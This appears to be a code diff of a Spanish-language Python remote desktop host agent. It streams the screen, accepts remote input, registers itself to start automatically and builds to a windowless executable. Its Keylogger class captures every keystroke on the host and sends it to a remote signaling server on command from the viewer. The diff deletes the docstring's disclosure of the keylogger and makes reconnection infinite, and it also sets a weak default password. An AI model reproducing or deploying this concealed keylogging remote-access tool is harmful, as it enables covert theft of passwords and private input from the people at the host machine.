@@ -1,17 +1,23 @@
 """
-Remote Desktop — Host Agent (con keylogger)
-============================================
-- Captura teclas físicas del host cuando el viewer lo activa
-- Envía las teclas al viewer en tiempo real
-- Nada se guarda localmente
+Remote Desktop — Host Agent
+============================
+- Lee nombre y contraseña de config.ini (mismo directorio que el exe)
+- Si no existe config.ini, lo crea con valores por defecto
 - Log en: %LOCALAPPDATA%\\RemoteDesktopHost\\host.log
+
+config.ini:
+    [host]
+    name = Mi PC
+    password = miclave
 
 Build:
     pip install pyinstaller aiortc mss pyautogui python-socketio "aiohttp==3.9.5" pillow numpy av websocket-client pynput
-    python -m PyInstaller --onefile --noconsole --name RemoteDesktopHost --hidden-import engineio.async_drivers.aiohttp --hidden-import aiohttp --hidden-import socketio.async_client --hidden-import pynput.keyboard._win32 host_agent.py
+    python -m PyInstaller --onefile --noconsole --name RemoteDesktopHost --hidden-import engineio.async_drivers.aiohttp --hidden-import aiohttp --hidden-import socketio.async_client --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 host_agent.py
 """
 
 import asyncio
+import configparser
+import hashlib
 import logging
 import pathlib
 import sys
@@ -41,12 +47,45 @@ log.info("=" * 50)
 log.info("  Remote Desktop Host Agent — iniciando")
 log.info("=" * 50)
 
-# ── Config ────────────────────────────────────────────────────────────────────
-SIGNAL_URL = "https://remoto-6lit.onrender.com"
-FPS        = 20
+# ── Config.ini ────────────────────────────────────────────────────────────────
+def get_config_path():
+    """Devuelve la ruta al config.ini junto al exe o script."""
+    if getattr(sys, "frozen", False):
+        # Corriendo como exe compilado
+        base = pathlib.Path(sys.executable).parent
+    else:
+        # Corriendo como script .py
+        base = pathlib.Path(__file__).parent
+    return base / "config.ini"
 
-log.info(f"Servidor: {SIGNAL_URL}")
-log.info(f"Python:   {sys.version}")
+CONFIG_PATH = get_config_path()
+
+def load_config():
+    config = configparser.ConfigParser()
+    if CONFIG_PATH.exists():
+        config.read(CONFIG_PATH, encoding="utf-8")
+        log.info(f"Config cargado desde: {CONFIG_PATH}")
+    else:
+        # Crear config.ini con valores por defecto
+        config["host"] = {
+            "name":     "Mi PC",
+            "password": "miclave123",
+        }
+        with open(CONFIG_PATH, "w", encoding="utf-8") as f:
+            config.write(f)
+        log.warning(f"config.ini no encontrado — creado con valores por defecto en: {CONFIG_PATH}")
+        log.warning("Editá config.ini con el nombre y contraseña correctos y reiniciá el agente.")
+
+    name     = config.get("host", "name",     fallback="Mi PC")
+    password = config.get("host", "password", fallback="miclave123")
+    return name.strip(), password.strip()
+
+HOST_NAME, HOST_PASSWORD = load_config()
+PASSWORD_HASH = hashlib.sha256(HOST_PASSWORD.encode()).hexdigest()
+
+log.info(f"Servidor:  https://remoto-6lit.onrender.com")
+log.info(f"Nombre PC: {HOST_NAME}")
+log.info(f"Python:    {sys.version}")
 
 # ── Imports ───────────────────────────────────────────────────────────────────
 log.info("--- Importando dependencias ---")
@@ -109,14 +148,15 @@ except Exception as e:
 log.info("--- Todos los imports OK ---")
 
 # ── ICE config ────────────────────────────────────────────────────────────────
+SIGNAL_URL = "https://remoto-6lit.onrender.com"
+FPS        = 20
+
 RTC_CONFIG = RTCConfiguration(iceServers=[
     RTCIceServer(urls=["stun:stun.l.google.com:19302"]),
     RTCIceServer(urls=["stun:stun1.l.google.com:19302"]),
     RTCIceServer(urls=["stun:stun2.l.google.com:19302"]),
     RTCIceServer(urls=["stun:stun3.l.google.com:19302"]),
-
 ])
-
 
 # ── Autostart ─────────────────────────────────────────────────────────────────
 def register_autostart():
@@ -161,7 +201,7 @@ class CaptureThread(threading.Thread):
         interval = 1.0 / self.fps
         with mss.mss() as sct:
             monitor = sct.monitors[1]
-            log.info(f"Capture thread — {monitor['width']}x{monitor['height']} @ {self.fps}fps")
+            log.info(f"Monitor: {monitor['width']}x{monitor['height']}")
             while not self._stop_event.is_set():
                 t0 = time.monotonic()
                 try:
@@ -208,15 +248,11 @@ class ScreenTrack(VideoStreamTrack):
 
 # ── Keylogger ─────────────────────────────────────────────────────────────────
 class Keylogger:
-    """
-    Captura teclas físicas del host usando pynput.
-    Cuando está activo envía cada tecla al viewer vía socket.
-    """
     def __init__(self):
-        self._listener  = None
-        self._active    = False
-        self._sio       = None
-        self._loop      = None
+        self._listener = None
+        self._active   = False
+        self._sio      = None
+        self._loop     = None
 
     def start(self, sio, loop):
         if self._active:
@@ -241,31 +277,19 @@ class Keylogger:
         if not self._active or not self._sio or not self._loop:
             return
         try:
-            # Tecla de caracter normal
             if hasattr(key, "char") and key.char:
                 char = key.char
             else:
-                # Tecla especial: Enter, Backspace, etc.
                 name = key.name if hasattr(key, "name") else str(key)
                 special_map = {
-                    "space":     " ",
-                    "enter":     "\n",
-                    "backspace": "[⌫]",
-                    "tab":       "[TAB]",
-                    "caps_lock": "[CAPS]",
-                    "shift":     "",
-                    "shift_r":   "",
-                    "ctrl_l":    "",
-                    "ctrl_r":    "",
-                    "alt_l":     "",
-                    "alt_r":     "",
-                    "cmd":       "",
-                    "delete":    "[DEL]",
-                    "esc":       "[ESC]",
+                    "space": " ", "enter": "\n", "backspace": "[⌫]",
+                    "tab": "[TAB]", "caps_lock": "[CAPS]",
+                    "shift": "", "shift_r": "", "ctrl_l": "", "ctrl_r": "",
+                    "alt_l": "", "alt_r": "", "cmd": "",
+                    "delete": "[DEL]", "esc": "[ESC]",
                 }
                 char = special_map.get(name, f"[{name.upper()}]")
-
-            if char:  # no enviar teclas modificadoras vacías
+            if char:
                 asyncio.run_coroutine_threadsafe(
                     self._sio.emit("keylog:key", {"char": char}),
                     self._loop,
@@ -341,7 +365,7 @@ async def wait_for_ice_gathering(pc, timeout=20):
         await asyncio.wait_for(event.wait(), timeout=timeout)
         log.info("✓ ICE gathering completo.")
     except asyncio.TimeoutError:
-        log.warning(f"ICE gathering timeout — enviando igual.")
+        log.warning("ICE gathering timeout — enviando igual.")
 
 
 # ── Main ──────────────────────────────────────────────────────────────────────
@@ -354,16 +378,18 @@ async def run():
     log.info("Creando cliente Socket.IO...")
     sio = socketio.AsyncClient(
         reconnection=True,
-        reconnection_attempts=10,
+        reconnection_attempts=0,  # infinito
         reconnection_delay=5,
     )
-    log.info("Cliente creado OK.")
 
     @sio.event
     async def connect():
         log.info("✓ CONECTADO al servidor de señalización.")
-        await sio.emit("host:register")
-        log.info("Host registrado. Esperando viewer...")
+        await sio.emit("host:register", {
+            "name":         HOST_NAME,
+            "passwordHash": PASSWORD_HASH,
+        })
+        log.info(f"Registrado como '{HOST_NAME}'. Esperando viewer...")
 
     @sio.event
     async def connect_error(data):
@@ -371,7 +397,7 @@ async def run():
 
     @sio.event
     async def disconnect():
-        log.warning("Desconectado. Reconectando...")
+        log.warning("Desconectado del servidor. Reconectando...")
         keylogger.stop()
 
     @sio.on("host:viewer-joined")
@@ -383,6 +409,7 @@ async def run():
             capture_thread.start()
 
             pc = RTCPeerConnection(configuration=RTC_CONFIG)
+            log.info("RTCPeerConnection creado.")
             pc.addTrack(ScreenTrack(capture_thread))
 
             @pc.on("icecandidate")
@@ -402,7 +429,7 @@ async def run():
             async def on_state():
                 log.info(f"WebRTC estado: {pc.connectionState}")
                 if pc.connectionState == "connected":
-                    log.info("✓ Stream activo.")
+                    log.info("✓ ¡Stream activo! Viewer viendo la pantalla.")
                 elif pc.connectionState == "failed":
                     log.error("✗ WebRTC falló.")
 
@@ -412,7 +439,7 @@ async def run():
             await sio.emit("signal:offer", {
                 "offer": {"type": pc.localDescription.type, "sdp": pc.localDescription.sdp}
             })
-            log.info("SDP offer enviado.")
+            log.info("SDP offer enviado con ICE candidates incluidos.")
 
         except Exception as e:
             log.error(f"Error iniciando WebRTC: {e}")
@@ -423,7 +450,7 @@ async def run():
         if pc:
             try:
                 await pc.setRemoteDescription(RTCSessionDescription(**data["answer"]))
-                log.info("Remote description seteada.")
+                log.info("Remote description seteada — negociando ICE...")
             except Exception as e:
                 log.error(f"Error en remote description: {e}")
 
@@ -439,6 +466,7 @@ async def run():
             cand.sdpMid        = c.get("sdpMid")
             cand.sdpMLineIndex = c.get("sdpMLineIndex")
             await pc.addIceCandidate(cand)
+            log.info(f"ICE remoto agregado: {candidate_str[:60]}...")
         except Exception as e:
             log.warning(f"ICE error: {e}")
 
@@ -447,7 +475,6 @@ async def run():
         loop2 = asyncio.get_event_loop()
         await loop2.run_in_executor(None, handle_input, data)
 
-    # ── Keylogger commands ────────────────────────────────────────────────────
     @sio.on("keylog:start")
     async def on_keylog_start():
         log.info("Viewer activó el keylogger.")
@@ -474,7 +501,7 @@ async def run():
     async def on_error(data):
         log.error(f"Error del servidor: {data.get('message')}")
 
-    # ── Loop de conexión ─────────────────────────────────────────────────────
+    # ── Loop de conexión ──────────────────────────────────────────────────────
     intentos = 0
     while True:
         intentos += 1
@@ -482,10 +509,10 @@ async def run():
         try:
             await sio.connect(
                 SIGNAL_URL,
-                transports=["websocket", "polling"],
+                transports=["polling"],
                 wait_timeout=30,
             )
-            log.info(f"Conectado.")
+            log.info("Sesión Socket.IO activa.")
             await sio.wait()
         except socketio.exceptions.ConnectionError as e:
             log.error(f"ConnectionError: {e}")
